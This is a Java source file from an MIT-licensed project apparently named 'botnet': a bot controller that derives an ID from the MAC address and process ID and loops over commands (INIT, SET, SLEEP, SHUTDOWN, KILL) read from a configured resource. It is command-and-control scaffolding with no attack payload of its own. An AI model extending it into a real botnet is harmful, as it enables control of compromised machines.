/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core;

import com.acmutv.botnet.config.AppConfiguration;
import com.acmutv.botnet.config.AppConfigurationService;
import com.acmutv.botnet.core.command.BotCommand;
import com.acmutv.botnet.core.command.BotCommandService;
import com.acmutv.botnet.core.pool.BotPool;
import com.acmutv.botnet.core.state.BotState;
import com.acmutv.botnet.tool.reflection.ReflectionManager;
import com.acmutv.botnet.tool.runtime.RuntimeManager;
import com.acmutv.botnet.tool.net.ConnectionManager;
import com.acmutv.botnet.tool.time.Duration;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;

/**
 * This class realizes the core business logic.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 */
public class CoreController {

  private static final Logger LOGGER = LogManager.getLogger(CoreController.class);

  /**
   * The bot ID.
   */
  private static String ID = generateId();

  /**
   * The bot state.
   */
  private static BotState STATE = BotState.INIT;

  /**
   * The bot thread pool.
   */
  private static final BotPool POOL = new BotPool();

  /**
   * The core main method.
   * It initializes and runs the bot.
   */
  public static void runBot() {
    while (true) {
      BotCommand cmd = getNextCommand();
      LOGGER.trace("command {} with params={}", cmd.getScope(), cmd.getParams());

      switch (cmd.getScope()) {

        case INIT:
          final String resource = (String) cmd.getParams().get("resource");
          init((resource != null) ? resource : AppConfigurationService.getConfigurations().getInitResource());
          break;

        case SET:
          @SuppressWarnings("unchecked")
          final Map<String,String> settings = (Map<String,String>) cmd.getParams().get("settings");
          set((settings != null) ? settings : new HashMap<>());
          break;

        case SLEEP:
          final Duration sleepTimeout = (Duration) cmd.getParams().get("timeout");
          sleep((sleepTimeout != null) ? sleepTimeout : new Duration(60, TimeUnit.SECONDS));
          break;

        case SHUTDOWN:
          final Duration shutdownTimeout = (Duration) cmd.getParams().get("timeout");
          shutdown((shutdownTimeout != null) ? shutdownTimeout : new Duration(60, TimeUnit.SECONDS));
          return;

        case KILL:
          kill();
          return;

        default:
          break;
      }
    }
  }

  /**
   * Generates the bot ID [MAC_ADDRESS]-[PID].
   * @return the bot ID.
   */
  private static String generateId() {
    LOGGER.traceEntry();
    final String mac = ConnectionManager.getMAC();
    final String pid = RuntimeManager.getJvmName();
    final String id = String.format("%s-%s", mac, pid);
    return LOGGER.traceExit(id);
  }

  /**
   * Parses a {@link BotCommand} from the resource specified in {@link AppConfiguration}.
   * @return the parsed command; command with scope NONE, in case of error.
   */
  private static BotCommand getNextCommand() {
    LOGGER.traceEntry();
    final String path = AppConfigurationService.getConfigurations().getCmdResource();
    BotCommand cmd = null;
    try (InputStream stream = new FileInputStream(path)) {
      cmd = BotCommandService.fromJson(stream);
    } catch (FileNotFoundException e) {
      LOGGER.error(e.getMessage());
      cmd = new BotCommand();
    } catch (IOException e) {
      LOGGER.error(e.getMessage());
    }

    return LOGGER.traceExit(cmd);
  }

  /**
   * Executes the bot command `INIT` with the specified resource.
   * @param resource the path to the CC initialization resource.
   */
  private static void init(String resource) {
    LOGGER.traceEntry("resource={}", resource);
    InputStream in;
    try {
      in = new FileInputStream(resource);
    } catch (FileNotFoundException e) {
      LOGGER.warn(e.getMessage());
      return;
    }
    POOL.kill();
    AppConfigurationService.loadJson(in);
  }

  /**
   * Executes the bot command `SET` with the specified settings.
   * @param settings the settings to load.
   */
  private static void set(Map<String,String> settings) {
    LOGGER.traceEntry("settings={}", settings);
    settings.forEach((k,v) -> {
      final boolean result = ReflectionManager.set(
          AppConfiguration.class,
          AppConfigurationService.getConfigurations(),
          k, v);
      if (result) {
        LOGGER.info("Successfully set property {} to value {}", k, v);
      } else {
        LOGGER.warn("Cannot set property {} to value {}", k, v);
      }
    });
  }

  /**
   * Executes the command `SLEEP` with the specified time period.
   * @param interval the time period to sleep.
   */
  private static void sleep(Duration interval) {
    LOGGER.traceEntry("period={}", interval);
    try {
      interval.getUnit().sleep(interval.getAmount());
    } catch (InterruptedException e) {
      LOGGER.trace(e.getMessage());
    }
  }


  /**
   * Executes the command `SHUTDOWN`.
   * @param timeout the time to shutdown.
   */
  private static void shutdown(Duration timeout) {
    LOGGER.traceEntry("timeout={}", timeout);
    POOL.shutdown(timeout);
  }

  /**
   * Executes the command `KILL`.
   */
  private static void kill() {
    LOGGER.traceEntry();
    POOL.kill();
  }

}
